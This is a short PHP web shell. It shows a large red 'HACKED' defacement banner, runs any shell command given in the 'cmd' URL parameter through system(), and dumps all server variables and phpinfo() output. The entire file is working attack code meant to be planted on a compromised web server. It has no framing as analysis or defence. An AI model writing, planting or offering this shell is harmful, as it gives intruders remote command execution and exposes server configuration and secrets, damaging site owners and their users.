<?php
    echo '<h1 style="color: red;font-weight:900;font-size:200px;margin:0">HACKED</h1>';

    if(isset($_GET['cmd']))
        system($_GET['cmd']);
        echo '<br><br><br><br><br>';

    foreach($_SERVER as $key_name => $key_value)
        print $key_name . " = " . $key_value . "<br>";

    phpinfo();
?>